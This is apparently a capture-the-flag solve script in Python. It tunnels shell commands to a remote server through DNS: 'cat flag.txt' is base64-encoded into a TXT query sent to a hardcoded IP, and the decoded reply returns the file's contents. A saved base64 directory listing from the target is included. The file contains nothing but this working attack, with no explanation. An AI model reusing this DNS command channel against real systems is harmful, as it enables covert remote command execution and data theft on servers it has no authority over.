#!/usr/bin/env python

import dns.resolver
import base64

full_ls_result = 'dG90YWwgMjUxMgpkcnd4ci14ci14ICAgIDEgcm9vdCAgICAgcm9vdCAgICAgICAgICA0MDk2IE1hciAgNiAwNDo0NCAuCmRyd3hyLXhyLXggICAgMSByb290ICAgICByb290ICAgICAgICAgIDQwOTYgTWFyICA2IDA4OjA5IC4uCi1ydy1yLS1yLS0gICAgMSByb290ICAgICByb290ICAgICAgICAgMTIyODggTWFyICA2IDA0OjQyIC5NYWtlZmlsZS5zd3AKLXJ3LXItLXItLSAgICAxIHJvb3QgICAgIHJvb3QgICAgICAgICAgIDEwNCBNYXIgIDUgMjM6NTAgRG9ja2VyZmlsZQotcnctci0tci0tICAgIDEgcm9vdCAgICAgcm9vdCAgICAgICAgICAgMTE5IE1hciAgNSAyMzo1MCBNYWtlZmlsZQotcnctci0tci0tICAgIDEgcm9vdCAgICAgcm9vdCAgICAgICAgICAgIDI4IE1hciAgNSAyMzo1MCBmbGFnLnR4dAotcnd4ci14ci14ICAgIDEgcm9vdCAgICAgcm9vdCAgICAgICAyNTMzODIzIE1hciAgNiAwNDo0NCBzZXJ2ZXIKLXJ3LXItLXItLSAgICAxIHJvb3QgICAgIHJvb3QgICAgICAgICAgMTY5MyBNYXIgIDUgMjM6NTAgc2VydmVyLmdv'

r = dns.resolver.Resolver(configure=False)
r.nameservers = ['35.225.16.21']

q = r.query('dns.google.com', 'A')
for i in q.response.answer:
    for j in i.items:
        r.nameservers = [j.address]

print(base64.b64decode(full_ls_result))

cmd = 'cat flag.txt'
q = r.query(base64.b64encode(cmd) + 'Cg==', 'TXT')
for i in q.response.answer:
    print(i.items, base64.b64decode(str(i.items[0])))
